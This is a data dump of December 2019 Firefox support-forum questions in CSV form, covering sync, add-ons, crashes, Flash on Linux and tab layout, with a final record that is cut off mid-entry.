+https://support.mozilla.org/en-US/questions/4614,2019-12-08 12:52:48 -0800,2019-12-09T01:19:28Z,Update of FlashPlayer for LinuxMint via Package Manager does not show in the Add-ons Manager - still says vunerable,"<p>My version of Linux Mint is 17.3. FireFox is 64 bit Quantum 66.0.3. I've installed FlashPlayer 32.0.0171 from a Ubunto repository. I've added a screen dump from the Add-ons Manager which has different information
+</p>",firefox-660;desktop;linux;,firefox,other,en-US,1271833;1271910;1271920;,seena
+https://support.mozilla.org/en-US/questions/4613,2019-12-08 12:45:21 -0800,2019-12-10T15:43:05Z,"In Earthlink e-mail, the tabs above messages (print, delete etc.) work in IE but NOT in Firefox any more.","<p>Earthlink E-mail both old and new versions do not work properly in Firefox 57 and higher. The function tabs above any message (print, delete etc.) don't respond to clicking.  They used to work just fine.  Everything works in IE but I use Firefox.  The Options are set to open tabs in new windows as always. Earthlink tech support says it's Firefox's problem.
+</p>",firefox-710;desktop;fix-problems;windows-10;,firefox,fix-problems,en-US,1272080;1272460;,suttoni
+https://support.mozilla.org/en-US/questions/4612,2019-12-08 12:20:48 -0800,2019-12-18T12:22:56Z,"save Bookmarks, History and all open Tabs+Windows of the last session, in a corrupted macOS","<p>Hello,
+</p><p>I visited my brother during the last week. His iMac was infected with some malware, and, because I have my own account in his computer with the same Apple-ID, also my computer got infected. I spoke with 6 senior technicians from the Europe Apple HQ in Cork / Ireland, but they have never seen such a resistant malware. In a word, I want to re-install the operating system and all applications in my computer. How can I save all my Bookmarks, History and all open Tabs+Windows of the last session, so that I can reload them in the Firefox I will install from scratch in the future? 
+Thank you for for all your valuable work at Mozilla, and thank you for your specific support now,
+Adrian
+</p>",firefox-680;other;desktop;,firefox,other,en-US,1271890;1271916;1274269;1274284;1274360;1274433;1274530;,adrianf
+https://support.mozilla.org/en-US/questions/4607,2019-12-08 11:55:54 -0800,2019-12-09T15:25:34Z,Set about:config display all by default,"<p>With v71 the about:config page doesn't display the full entries anymore instead you have to click on show all, putting unnecessary wear on mice. Is there a way to reset this to the old behavior where the entries are shown by default?
+</p>",firefox-710;customize;desktop;windows-10;configeditor;configeditor71;,firefox,customize,en-US,1271813;1271840;1271842;1271856;1272105;1272156;1272160;1272171;,michkov
+https://support.mozilla.org/en-US/questions/4605,2019-12-08 11:46:12 -0800,2019-12-12T02:37:40Z,Youtube Music cannot start. It appear shortly and restart to upload again entering in a loop. It worked in the past.,"<p>My system is LM 19.2 FF Version 70.0.1 (64-Bit). Noted that Chrome in the same machine play YouTube Music without problem and attention Youtube video has no problem to be played in FF.
+</p>",websites;firefox-700;desktop;linux;,firefox,websites,en-US,1271995;1272045;1272217;1272263;1272426;1272682;1272880;,juan.ehrenhaus
+https://support.mozilla.org/en-US/questions/4604,2019-12-08 11:36:30 -0800,2019-12-09T03:42:58Z,"I am no longer to click on any of Pinterest's ""windows"". Nothing happens when I click on them!","<p>I am able to access any of the ""windows"" on Pinterest using Chrome but not on Firefox. I believe this started about 3 weeks ago. What am I doing wrong?
+</p>",firefox-710;other;desktop;windows-7;,firefox,other,en-US,1271934;,jimmcquillen
+https://support.mozilla.org/en-US/questions/4603,2019-12-08 11:24:38 -0800,2019-12-17T02:31:25Z,Backup Multi-Account Containers,"<p>Hi Team. I love the Multi-Account Containers for Firefox. It's an excellent extension. However there's not means of archiving, syncing or backup for all your fastidious work configuring your various websites to open within specific containers. If your local Firefox profile is lost, so is your hard work with container setup. We need means of backing up our container setup, either via some export / import utility or using Firefox Sync. Either is fine as this extension is a more advanced feature, but totally awesome! Thanks.
+</p>",firefox-710;other;desktop;,firefox,other,en-US,1271814;1274178;,cd5609
+https://support.mozilla.org/en-US/questions/4602,2019-12-08 11:20:10 -0800,2019-12-09T10:52:53Z,Firefox Enhanced Tracking Protection doesn't seem to be working,"<p>I was reading an article on Sophos about Firefox and how it is protecting our privacy
+</p><p><a href=""https://nakedsecurity.sophos.com/2019/11/27/firefox-gets-tough-on-tracking-tricks-that-sneakily-sap-your-privacy/"" rel=""nofollow"">https://nakedsecurity.sophos.com/2019/11/27/firefox-gets-tough-on-tracking-tricks-that-sneakily-sap-your-privacy/</a>
+</p><p>In the comments it listed 3 sites to check how unique your browser is:
+<a href=""https://www.deviceinfo.me"" rel=""nofollow"">https://www.deviceinfo.me</a> – Device Info
+<a href=""https://panopticlick.eff.org"" rel=""nofollow"">https://panopticlick.eff.org</a> – Panopticlick
+<a href=""https://amiunique.org"" rel=""nofollow"">https://amiunique.org</a> – AmIUnique
+</p><p>I have Fingerprinters checked to be blocked but on all these sites it still was able to uniquely ID my browser. I thought I had the options set pretty well to lock it down but it doesn't seem that way. Is something not working right or ???
+</p><p>Thanks
+</p>",privacy-and-security_1;firefox-710;desktop;windows-10;probablynotafirefoxproblem;,firefox,privacy-and-security,en-US,1271809;1271812;1271817;1271818;1271820;1271821;1271823;1271826;1271829;1271830;1271834;1272059;1272066;1272068;1272070;1272076;,AZBigDog
+https://support.mozilla.org/en-US/questions/4601,2019-12-08 10:53:53 -0800,2019-12-09T06:48:19Z,Firefox 71 Will Not Work On My Windows 7 Laptop,"<p>Hello everyone,
+</p><p>I have a similar problem to those mentioned in the discussions here...
+</p><p><a href=""https://support.mozilla.org/en-US/questions/1274248"" rel=""nofollow"">https://support.mozilla.org/en-US/questions/1274248</a>
+</p><p><a href=""https://support.mozilla.org/en-US/questions/1274407"" rel=""nofollow"">https://support.mozilla.org/en-US/questions/1274407</a>
+</p><p>..but the solutions given there do not help me here I am afraid.
+</p><p>We use Firefox with automatic updates switched on, on 3 systems here -  2 Windows 7 and 1 Windows 10.
+</p><p>Firefox has updated to 71 on all 3 systems.
+</p><p>The Windows 10 installation went without a hitch, but the 2 Windows 7 systems have had problems, although one has resolved itself somehow.
+</p><p>Unfortunately the update on my Windows 7 laptop has not gone well.
+</p><p>Firefox has become unusable on this system since the Firefox 71 update. 
+</p><p>Firefox keeps crashing every time that I try to run it, showing a Windows error box stating ""Firefox has stopped working and need to close"" message, along with the following crash info...
+</p><pre>Problem signature:
+ Problem Event Name:	APPCRASH
+ Application Name:	firefox.exe
+ Application Version:	71.0.0.7275
+ Application Timestamp:	5de4f320
+ Fault Module Name:	StackHash_312e
+ Fault Module Version:	0.0.0.0
+ Fault Module Timestamp:	00000000
+ Exception Code:	c0000005
+ Exception Offset:	000000006fff150a
+ OS Version:	6.1.7601.2.1.0.768.3
+ Locale ID:	2057
+ Additional Information 1:	312e
+ Additional Information 2:	312e0f649e68df8b8010198c924de691
+ Additional Information 3:	2e28
+ Additional Information 4:	2e281e0f3e7e2e5b3bd20302d95cb119
+</pre>
+<p>I Cannot open in safe mode  - it crashes immediately. 
+</p><p>I have tried an uninstall/fresh install  - still does not solve the problem.
+</p><p>I therefore have had to revert back to Firefox 70.0.1 to get it working again, and have had to switch off automatic updates until I can solve this problem.
+</p><p>Any help or advice would be much appreciated.
+</p><p>Thank you
+</p>",desktop;fix-problems;needsinfo;troubleshootingdetailsmissing;,firefox,fix-problems,en-US,1271971;1271976;,firefoxdestroyer
+https://support.mozilla.org/en-US/questions/4600,2019-12-08 10:32:23 -0800,2019-12-09T06:56:07Z,"Used the fix for Tabs on Bottom but lost the top right buttons for minimize, cascade, restore, exit.","<p>The above pretty much sums it up.  I at least have tabs on bottom and haven't done any coding in 40+ years but I'll try some tweaks but would really like the above mentioned buttons back.
+</p>",firefox-710;customize;desktop;windows-10;unsuppportedhacks;unsupporteduserchromecss;userchromecss;unsupported;tabsonbottom71;tabsonbottom;,firefox,customize,en-US,1271868;1271980;,jcurran516
+https://support.mozilla.org/en-US/questions/4599,2019-12-08 09:57:05 -0800,2019-12-08T13:45:27Z,Can't login to uscellular.com,"<p>When I try to login to my account on U.S. Cellular, it immediately takes me to another page that says, ""It's not you, it's us.
+An error has occurred, and we can't display this page right now.""  .. except that it isn't.  I can get there fine using either Vivaldi or Google Chrome, but going to the login page with Firefox takes me right back to the error page.  Though I have other browsers on my laptop, I'd rather not have to use them.  What is going on with Firefox?
+</p>",firefox-710;websites;desktop;windows-10;uscellularcom;webcompat;,firefox,websites,en-US,1271788;1271822;,rosawood
+https://support.mozilla.org/en-US/questions/4598,2019-12-08 09:37:30 -0800,2019-12-13T14:07:00Z,Downloads lentos,"<p>Qualquer download que eu faço pelo navegador não ultrapassa os 130 kbps.Minha Internet é 120 Mega e no Chrome,Edge ou qualquer outro navegador sem ativar o paralel download baixa na média dos 1000 kbps,ativando o paralel nas flags vai pra até 5000.Então teria alguma configuração para destravar esse limite de 130 kbps no Firefox?
+</p>",download-and-install_1;firefox-710;desktop;windows-81;,firefox,download-and-install,pt-BR,1272914;1273346;1273357;,kaiquemurilo991
+https://support.mozilla.org/en-US/questions/4597,2019-12-08 09:18:08 -0800,2019-12-09T11:53:31Z,"I cant start Mozilla Firefox, terminating process doesnt work either.","<p>Hey there, 
+</p><p>today i used my browser completely normal, everything worked just fine.
+After i started doing my Windows Updates though and also updated my Anti Virus Software, Mozilla doesn't start anymore, I cant end the task/process either, not even via system32 cmd command (taskkill /IM firefox.exe /t /f) because it tells me that I don't have the necessary access to do that.
+</p><p>I need to fully restart my Computer to kill the process.
+When I start it in safe mode via windows+r run command (firefox -safe-mode) it started up once, and now it doesnt do that either.
+</p><p>I really don't know what exactly caused this and it started skyrocketing my blood pressure after I reinstalled it 4 times now and it still didn't working.
+</p>",desktop;fix-problems;escalate;probablynotafirefoxproblem;,firefox,fix-problems,en-US,1271770;1271778;1271782;1271796;1271798;1271853;1271927;1271928;1271929;1271964;1272022;,eikebleeker
+https://support.mozilla.org/en-US/questions/4596,2019-12-08 09:13:08 -0800,2019-12-08T16:52:30Z,How can I find a specific add-on on addons.mozilla.org since the search function doesn't find it by exact name or author?,"<p>I was trying to locate all of my add-ons on <a href=""https://addons.mozilla.org"" rel=""nofollow"">https://addons.mozilla.org</a> so I could bookmark them for a backup in case my PC has a figurative meltdown. Some are extremely simple to find but others seem impossible to locate. I even logged into the addons page thinking it would show my installed addons so I could locate them. Well no, it doesn't. Which doesn't make sense. Similarly lacking sense is an advanced search. There doesn't seem to be a way to search by title or author, just by a vague keyword. From what I'm seeing of results, it seems that it either picks one word out of many to search for or boils it down to some other vague term. Even if I type in the exact title it will bring up completely different results along with some that are similar to what I have installed. Author searches don't bring up anything. There has to be a way to locate specific add-ons right? The search seems completely useless as is except to browse. Similarly, why don't installed add-ons link to their page on <a href=""http://addons.mozilla.org?"" rel=""nofollow"">addons.mozilla.org?</a> So how do I find my addon? This is exactly the reason WHY I want to bookmark them so that I don't have a problem finding them in the future when there's more addons to sift through. Amazing that I can't find it while I have it installed. (The one I'm looking for is Dark YouTube Theme by NiCU Natrapeiu)
+</p><p>I know I can just switch to any number of other similar add-ons but this one works and it infuriates me that I'd have to choose a different one just because the search function is terrible. Keep in mind it is already installed. I want to find the page for it at <a href=""http://addons.mozilla.org"" rel=""nofollow"">addons.mozilla.org</a> so that I can reinstall it in the future should I need to do a fresh installation.
+</p>",firefox-710;customize;desktop;windows-7;add-ons;,firefox,customize,en-US,1271794;1271857;1271867;,oopalmer
+https://support.mozilla.org/en-US/questions/4595,2019-12-08 08:54:05 -0800,2019-12-08T08:54:05Z,Como alterar a forma que a caixa de email e senha mostram dados já salvos?,"<p>Olá amigos, eu dostaria de saber se há alguma maneira de alterar a forma que email e senhas salvos aparecem. desde a ultima atualização notei que aparece um cadeado e um dizer ""Deste site"" e quero removê-los, deixando como antes.
+</p><p>imagem em anexo
+</p>",firefox-710;customize;desktop;,firefox,customize,pt-BR,"",abobada
+https://support.mozilla.org/en-US/questions/4594,2019-12-08 08:53:40 -0800,2019-12-08T21:07:49Z,Firefox Dictionary extension,"<p>This must have been asked over and over, but I've not been here before, so please forgive me. I cannot seem to find a simple dictionary extension for Firefox Quantum, something which defines a highlighted word. The one in Chrome works just fine, but I prefer to use Firefox. We used to have pop-up dictionaries, but they seem to have gone away. A search on the extensions page invariable deals only with translation dictionaries. Should I just stop looking for one, or am I missing something. Thanks.
+</p>",firefox-710;customize;desktop;windows-10;,firefox,customize,en-US,1271895;1271900;,donaldwhittington
+https://support.mozilla.org/en-US/questions/4593,2019-12-08 08:50:06 -0800,2019-12-08T19:32:25Z,"I have a Desktop, Hybrid Laptop, and a Google Smartphone. If I sync the bookmarks, which device takes precendence?","<p>My Desktop has bookmarks going all the way back to Netscape 1.0 (1995), my LapPad bookmarks go back just a few years. I would like to be able to decide which takes precedence like the Contacts merge in Gmail.
+</p><p>I have been a database user/programmer/coder for the last 50 years, and I know the grief you can run into if update does not go as planned. I could wind up with 1995 data overwriting 2019 data.
+</p><p>Please help or point me to where I can find answers?
+</p>",firefox-710;sync;desktop;windows-10;,firefox,sync,en-US,1271873;1271882;1271884;,brianzdodd
+https://support.mozilla.org/en-US/questions/4592,2019-12-08 08:49:16 -0800,2019-12-19T12:46:25Z,"How can I access the firefox bookmark ""library"" window so I can rename/move/delete bookmarks quickly.  It seems to be hidden.","<p>I am trying to get to the bookmarks library window similar to to the attached. 
+</p><p>I have searched all over but can not seem to find an up to date article.  (even the Mozilla help article is out of date).
+</p>",bookmarks;firefox-700;desktop;windows-10;,firefox,bookmarks,en-US,1271783;1271808;1272672;1272680;1272683;1274669;1274819;,applephx
+https://support.mozilla.org/en-US/questions/4589,2019-12-08 08:18:58 -0800,2019-12-08T08:35:20Z,How to change the picture-in-picture default monitor?,"<p>71's new picture-in-picture feature could be useful, but I can't find any way to control which monitor the video is played on. It seems to always open on Windows' 1st monitor, which for me is almost always turned off.
+Of course Windows in it's infinite wisdom will not let you choose which monitor is number 1. This basically makes the feature useless. :(
+So, is there some setting somewhere in the about:config where I can control which monitor is default? I can't find an obvious one, at least.
+EDIT: I was wrong. It doesn't always open the video on the 1st monitor. It just always opens the video on the monitor to the left of the one the browser is on. :D
+</p>",firefox-710;customize;desktop;windows-10;,firefox,customize,en-US,1271751;1271754;,ArniVidar
+https://support.mozilla.org/en-US/questions/4587,2019-12-08 07:34:23 -0800,2019-12-12T06:55:21Z,IT guy changed my password without getting a recovery key; info still exists on two other computers,"<p>I'm trying to switch to a new desktop. IT guy claimed to be a Firefox expert, but, when my password didn't work, he changed it without getting a recovery key. My old setup still exists on my old desktop and my laptop. Is there any way to save what's on either of those two computers so that I'm not starting from zero? I have literally been brought to tears at the thought of saving all those bookmarks and passwords manually. Any help would be deeply appreciated!
+</p>",firefox-710;sync;desktop;,firefox,sync,en-US,1271891;1271957;1272656;1272657;,mpbodin
+https://support.mozilla.org/en-US/questions/4586,2019-12-08 07:10:00 -0800,2019-12-09T15:49:39Z,"firefox interface font is to small for me to read, how to make it larger","<p>the theme and font interface is terribly small, it is barely readable for me without straining my eyes. I am to to point where I have to guess where to click in the drop down menus because the print is so small .
+there addon theme and font changer does not work. it has not work for a couple of years now
+there was a ""userChrome.css"" script that I was using that also no longer works. 
+I have been a firefox user since it's beginning. from my  online reading other users are having this same problem.
+I have not been able to find a online  solution
+whet can be done to help or is there any help coming if the future
+</p>",firefox-700;customize;desktop;linux;,firefox,customize,en-US,1271743;1271750;1271753;1272125;1272158;1272178;,rowlandsushi
+https://support.mozilla.org/en-US/questions/4585,2019-12-08 06:53:00 -0800,2019-12-14T15:16:00Z,What kind of forum has this become?,"<p>FAQ based forum WT? Like repeated questions?
+Again a forced update?
+Why does moz have such a serious problem with page tabs next to it's actual page?
+Address bar/shortcut bar in between?
+HELLO! They are PAGE tabs...not button bar tabs/address bar tabs...PAGE TABS!!!!!
+And this time where the tabs were moved some transparent art image and tabs back at top?
+And me on another quest to move the tabs to where they belong?
+</p>",firefox-710;other;desktop;windows-7;unclearquestion;,firefox,other,en-US,1271933;1272269;1273588;1273592;,Offsprung
+https://support.mozilla.org/en-US/questions/4584,2019-12-08 06:47:59 -0800,2019-12-08T10:12:34Z,Firefox briefly freezes while loading a new tab,"<p>I'm running Firefox 71 on Linux. I notice that when I load a page into a new tab (either from middle-clicking links, or entering URL manually), Firefox UI is unresponsive for about 2 seconds. During that time, I'm unable to switch tabs--either by clicking, or with Ctrl+Tab. I tried restarting with all add-ons disabled, but the problem persists.
+</p><p>The problem disappears if i were to create a new temporary profile, though. So it's clear that something in my current profile is screwed up, but not sure what. Other things I've tried: quit Firefox, I vacuumed all `.sqlite` files in my profile; cleaned up all the cached images (not site data, though).
+</p><p>I'm keen to continue using my profile rather than create and setup a new one. Any help to trouble shoot this problem is appreciated.
+</p><p>Thanks.
+</p>",firefox-710;desktop;fix-problems;linux;troubleshootingdetailsmissing;,firefox,fix-problems,en-US,1271748;1271752;1271755;,jeenuv
+https://support.mozilla.org/en-US/questions/4583,2019-12-08 06:46:47 -0800,2019-12-10T07:42:47Z,"I've launched in safe mode. Still crashing.  Either tab or program, or both. Issues with Last Pass, Evernote? Can someone review my error logs? Windows 10 PC.","<p>Slow and crashes in Chrome and Edge too.
+</p>",firefox-710;desktop;fix-problems;windows-10;escalate;outofmemory;,firefox,fix-problems,en-US,1271847;1271949;1271958;1271961;1271972;1271973;1271974;1271987;1271989;1271994;1272085;1272133;1272225;1272230;1272241;1272324;,dineybgood
+https://support.mozilla.org/en-US/questions/4580,2019-12-08 05:52:11 -0800,2019-12-12T02:59:28Z,new 'dark theme' has awful blue lines/blue highlights and white menus,"<p>new 'dark theme' has awful blue lines/blue highlights and white menus. help!
+</p>",firefox-710;customize;desktop;windows-10;needsinfo;,firefox,customize,en-US,1272889;,sethiegretchencourtney
+https://support.mozilla.org/en-US/questions/4579,2019-12-08 05:42:33 -0800,2019-12-09T04:55:25Z,How to stop URL bar from enlarging on click?,"<p>I am used to double clicking to select words in the URL bar. Not too long ago Firefox had an update where if you click on the URL bar then it would enlarge a bit. When it enlarges, so does the font, meaning that if I try to double click a word, the font resizing could shift the text. It is something minor, but something I am so used to doing. I was wondering if I could go back to the old URL bar that only got a blue highlight on click.
+</p>",customize;desktop;windows-10;,firefox,customize,en-US,1271742;1271848;1271854;1271938;,user2053450
+https://support.mozilla.org/en-US/questions/4578,2019-12-08 04:58:48 -0800,2019-12-08T04:58:48Z,Hovering on tabs opens the Mac menu bar in full screen mode,"<p>duplicate of <a href=""/questions/1274577"" rel=""nofollow"">/questions/1274577</a> thread.
+</p><p>When you move your mouse cursor on the tab area to select a tab, it happens quite often that the Mac menu bar opens automatically and covers the tab area, thus preventing you from opening the tab (see the screenshot). 
+</p><p>This is a rather inconvenient issue with Firefox for Mac. 
+</p><p>For example, in Chrome for Mac, there is a vertical gap on top of the tabs to avoid this effect - see the screenshot. Or in Safari, tabs are located below the address bar. 
+</p><p>Is there any solution to the issue?
+</p>",tabs;firefox-710;desktop;mac-os;,firefox,tabs,en-US,"",babakf
+https://support.mozilla.org/en-US/questions/4577,2019-12-08 04:55:01 -0800,2019-12-09T10:38:15Z,Hovering on tabs in fullscreen opens the Mac menu bar,"<p>When I'm using Firefox for Mac in full screen, it happens often that I hover the mouse cursor on one of the tabs, and the Mac menu bar opens and covers the entire tab area (see the screenshot). So I can't choose the tab anymore, and have to move the cursor away from the tab area so the Mac menu hides again. 
+</p><p>This is a quite inconvenient issue with Firefox on Mac. 
+</p><p>For example, in Chrome for Mac, there is a small vertical gap on top of the tabs to avoid that effect (see the screenshot). Or in Safari,  tabs are located below the address bar. 
+</p><p>Is there any solution to this issue?
+</p>","",firefox,tabs,en-US,1272073;,babakf
+https://support.mozilla.org/en-US/questions/4576,2019-12-08 04:52:23 -0800,2019-12-22T00:49:07Z,Installed Flash update.  Firefox disagrees.  Adobe says its already installed. Mint seems to agree.,"<p>Nothing seems to work.  An appropriate plugin seems to be installed and, after downloading the latest version from Adobe, a retry informed me that Flash was already installed.  Firefox does not agree.  The download from Adobe informs me that upgrading is a 3-stage process but takes me no further than stage 1.  This used to be a doddle under XP.  You just found and ran the executable file in the Download folder.  I can find no executable files in my Download folder.  My current Linux version is 18.3 Sylvia.  I am sure that this used to be handled automatically by Firefox updates in previous Mint versions.  Now, however, it doesn't seem to matter what I try - whether using the Mint's Software function or going onto Adobe's download page.  I always seem to finish up in the same place with the computer just looking at me and declaring that Flash is already installed.  The Firefox Addons list includes Flash but nothing I do will get it working.
+</p>",download-and-install_1;firefox-700;desktop;linux;flash-problem;,firefox,download-and-install,en-US,1271827;1271997;1272304;1272409;1272685;1272691;1273239;1273360;1273394;1273416;1274490;1274505;1275268;1275427;,Thermoman
+https://support.mozilla.org/en-US/questions/4575,2019-12-08 04:34:20 -0800,2019-12-08T05:03:10Z,Auto add www. and .com to address in Quantum,"<p>What use to work in ""about:config"" to auto add prefix (www.) and suffix (.com) doesn't work in Firefox Quantum. Looking for what works.
+The ""browser.fixup.alternate.prefix and suffix"" are set to default, string, (www. and .com)
+Not sure if default is to apply or not apply.
+thanks
+</p>",firefox-700;customize;desktop;windows-7;,firefox,customize,en-US,1271730;1271733;,mchldpy
+https://support.mozilla.org/en-US/questions/4574,2019-12-08 04:28:14 -0800,2019-12-10T08:41:01Z,Google profile pictures not showing (lh3.googleusercontent.com),"<p>Hi,
+Firefox is not showing the Google profile pictures (image1).
+</p><p>- It works on other browsers.
+- I tried safe mode.
+- I restarted with addons disabled.
+- I cleared cache and cookies.
+- Browser is up to date.
+</p><p>nothing.
+</p><p>Any image from <a href=""https://lh3.googleusercontent.com"" rel=""nofollow"">https://lh3.googleusercontent.com</a> doesn't show.
+I get image2 when I right click ""View image"" on the profile pictures that don't show.
+</p><p>How can I fix this?
+</p><p>Thanks.
+</p>",firefox-710;desktop;fix-problems;macos-1015;escalate;picture;notafirefoxproblem;,firefox,fix-problems,en-US,1271734;1271749;1271846;1272323;1272336;,mrwndk9
+https://support.mozilla.org/en-US/questions/4572,2019-12-08 02:45:00 -0800,2019-12-08T03:05:03Z,v71 appears to have eliminated the local disconnect/device clear feature,"<p>Usually when I disconnect a two (2) checkbox 'Disconnect Sync' box appears, which after checking removes bookmarks etc from browser.  V71 is not doing this and leaves my personal info in the browser I log in to.
+</p>",firefox-710;sync;desktop;windows-10;,firefox,sync,en-US,1271714;,kurtofthenorth
+https://support.mozilla.org/en-US/questions/4571,2019-12-08 02:13:37 -0800,2019-12-10T01:04:07Z,Firefox synchronisiert keine offene Tabs. Alles andere wird synchronisiert.,"<p>auch die Einrichtung eines weiteren Gerätes hat das Problem nicht gelöst
+</p>",firefox-710;sync;desktop;windows-10;,firefox,sync,en-US,1272079;1272086;1272087;1272089;1272091;1272093;1272094;1272238;1272277;,master-marko
+https://support.mozilla.org/en-US/questions/4568,2019-12-08 00:45:50 -0800,2019-12-08T01:35:25Z,youtube's relevant videos even in multi-account cointainer add-on,"<p>im concerning about youtubes feed! since im using multi-account container add-on im expecting youtube know nothing about me and my favorite videos but somehow youtube videos are still relevant to my account! ( im clrearing the caches as well!)
+what can be wrong ? or how can i fix this issue?
+</p>",privacy-and-security_1;firefox-710;desktop;windows-10;youtube;multiaccountcontainers;,firefox,privacy-and-security,en-US,1271707;1271709;1271710;,iman9543.arya
+https://support.mozilla.org/en-US/questions/4565,2019-12-07 23:08:06 -0800,2019-12-07T23:36:08Z,What does the “PR_END_OF_FILE_ERROR” error mean?,"<p>I was playing around with some SSL settings in Emby, and I managed to get this 'Secure Connection Failed' error which says: An error occurred during a connection to emby.home.local:8920. PR_END_OF_FILE_ERROR
+</p><p>I'm not trying to fix the error, I just want to know what it means. I can't find any official documentation regarding this specific SSL error message.
+</p>",firefox-710;desktop;fix-problems;windows-10;emby;probablynotafirefoxproblem;,firefox,fix-problems,en-US,1271698;1271699;1271700;,aman207
+https://support.mozilla.org/en-US/questions/4564,2019-12-07 22:26:09 -0800,2019-12-07T22:41:32Z,"É possível ativar ""Media Control Overlay"" no Firefox?","<p>Boa noite, até então eu usava o Chrome como navegador padrão, porém após problemas, decidi que seria melhor mudar para o Firefox.
+Após mudar, eu vi que, ao reproduzir vídeos/músicas, (De sites como Deezer ou YouTube) o Firefox não apresenta um recurso que eu usava muito quando usava o Chrome, que era um pequeno player de mídia, o mesmo aparecia quando você pressionava o botão de volume do teclado, assim facilitando a pausa e a troca de mídia.
+</p>",customize;desktop;,firefox,customize,pt-BR,1271692;,eusulgl
+https://support.mozilla.org/en-US/questions/4563,2019-12-07 20:58:16 -0800,2019-12-13T07:56:53Z,Reconnect to firefox sync prompt at every computer restart?,"<p>I recently got a new computer and installed firefox. Every time the computer restarts, it wants me to log in for the sync feature (""Reconnect to Firefox Account"" appears under options with an exclamation point). This did not happen on my old computer, so this is weird because all I've done is reinstalled firefox with the exact same settings/addons as before. This is my personal desktop computer so I don't want to have to re-log in every restart.
+</p>",firefox-710;sync;desktop;windows-10;,firefox,sync,en-US,1271686;1271731;1272980;1273005;1273160;1273225;1273240;,jamiermccall
+https://support.mozilla.org/en-US/questions/4560,2019-12-07 19:26:18 -0800,2019-12-08T14:29:44Z,Como acessar site de cameras (DVR) -,"<p>Nao carrega o plugin fornecido pelo site entao nao consigo ver as cameras.
+site: 187.17.34.155:8080
+</p>",firefox-710;websites;desktop;windows-7;,firefox,websites,pt-BR,1271741;1271839;,jrgarcia1
+https://support.mozilla.org/en-US/questions/4559,2019-12-07 19:17:08 -0800,2019-12-08T00:57:02Z,Is there a way to always open links in new tabs from a specific tab?,"<p>Hi all,
+</p><p>So I have a pinned tab that is automatically refreshed via an extension. That extension is URL based. From time to time I may accidentally clicked a link on that tab and the URL changed then the auto-refresh stops.
+</p><p>In order to keep the auto-refreshed tab's URL, I would like to always open the links on that tab in a new tab, but keep normal behavior on any other tabs. Is it possible to do that?
+</p><p>Thanks,
+</p><p>Jeremy
+</p>",tabs;firefox-710;desktop;windows-10;,firefox,tabs,en-US,1271690;1271694;1271695;1271701;1271702;1271706;,Jerouy
+https://support.mozilla.org/en-US/questions/4557,2019-12-07 18:33:56 -0800,2019-12-07T18:33:56Z,Numerous Addons not working after fresh install version 71.0 on Fedora 31,"<p>duplicate of <a href=""/questions/1274556"" rel=""nofollow"">/questions/1274556</a> thread.
+</p><p>I just reinstall Firefox version 71.0 on my main workstation running fedora 31 and numerous addons : LastPass Firefox-containers hide/show toolbar Joplin... do not work they install properly but I can't use them.
+</p>",firefox-680;customize;desktop;linux;,firefox,customize,en-US,"",gros319
+https://support.mozilla.org/en-US/questions/4556,2019-12-07 18:33:47 -0800,2019-12-07T18:33:47Z,Numerous Addons not working after fresh install version 71.0 on Fedora 31,"<p>I just reinstall Firefox version 71.0 on my main workstation running fedora 31 and numerous addons : LastPass Firefox-containers hide/show toolbar Joplin... do not work they install properly but I can't use them.
+</p>",fedora31;add-ons;,firefox,customize,en-US,"",gros319
+https://support.mozilla.org/en-US/questions/4555,2019-12-07 18:29:34 -0800,2019-12-07T19:54:42Z,No convenient way to rate all installed extensions,"<p>I've been using Firefox for a while and I came across some great extensions.
+I would like to give each of them a rating to help other people find better extensions, but there seems no easy way to do so.
+On Google Play you can review installed extensions in Play Store easily by click each of them and use the one-tap rating button.
+On iOS, if you allow them, App Store will even prompt you a one-tap rater after you've installed some app and used for a while, which is even more convenient.
+I wonder if Firefox (could) have the same experience. Without it, it's harder to encourage people (who wish to spare the time) to involve in the rating system.
+</p>",firefox-710;customize;desktop;linux;,firefox,customize,en-US,1271677;,zzhhbyt1
+https://support.mozilla.org/en-US/questions/4552,2019-12-07 17:19:01 -0800,2019-12-10T15:46:49Z,Google Voice page will not load - what the H3LL did you (developers) do to Firefox NOW???,"<p>Up until you pushed ver 71 Firefox on me, I had ZERO problems with Google Voice page loading. Now only the banner on the page load with my acct name and icon and the rest of the page is BLANK except for the never ending spinning circle in the middle .... are you taking lessons in buggyness from CrApple OS???  My Voice account open just fine and fast on Opera, Brave, Vivaldi, and Edge Beta!!!
+Maybe you (Mozilla) should switch to the Chrome engine too, you are too buggy 90% of the time!
+PC - Win 7 32-bit, ALL UP TO DATE!
+</p>",firefox-710;desktop;fix-problems;windows-7;escalate;needsinfo;pleasedonotrant;googlevoice;probablynotafirefoxproblem;,firefox,fix-problems,en-US,1271703;1271766;1271791;1272349;1272353;1272356;1272361;1272363;1272370;1272393;1272415;1272425;1272441;1272461;,keithbenicek
+https://support.mozilla.org/en-US/questions/4551,2019-12-07 15:59:22 -0800,2019-12-07T16:18:59Z,Multiple login at same website,"<p>For managing transport fare cards, we have multiple logins for the same web address,  the user names are the card number.
+Haven't logged in for about 3 years after moving to rural. 
+1.  I can only see 1 saved ""login &amp; password"" in about:logins, for that address.  (should be 2)
+</p><pre>              (Have an issue with resetting password for other account)
+</pre>
+<p>2. Trying to reset password for second account jumps to login page (with first account details auto-fill)
+3. Entering username for second account inserts password from first account.
+Back in 2016 I am sure it was all working ok,  (assuming accurate neural memory)
+</p><p>Q. Please confirm if FF saved logins works ok with multiple accounts for same web address.
+</p>",privacy-and-security_1;firefox-710;desktop;windows-7;,firefox,privacy-and-security,en-US,1271651;,tonigau
+https://support.mozilla.org/en-US/questions/4550,2019-12-07 15:46:04 -0800,2019-12-09T15:23:03Z,Does the latest update have issue with switching between one tab and another?,"<p>I think Firefox updated a day or so ago on my computer. Since then, when switching between tabs there are times when it takes several seconds to go to the tab I click on, and Firefox is locked up while I wait for the switch. Is this a known issue, and if so when might it be fixed?
+</p>",firefox-710;desktop;fix-problems;windows-7;,firefox,fix-problems,en-US,1272078;1272169;,Marklayne
+https://support.mozilla.org/en-US/questions/4547,2019-12-07 14:13:49 -0800,2019-12-11T23:57:23Z,"OS reinstall on one machine, removed bookmarks from all machines","<p>I re-installed my OS on a machine.  Signed into firefox, and all my bookmarks are missing.  Look at my other machines, and my phone, and all of their bookmarks are missing.  
+</p><p>I did not change my account password.  I changed nothing on the other machines, but it synced the new install's blank(well, the Getting started) bookmark set.  WTF?!  There's 5 years of bookmarks missing now.
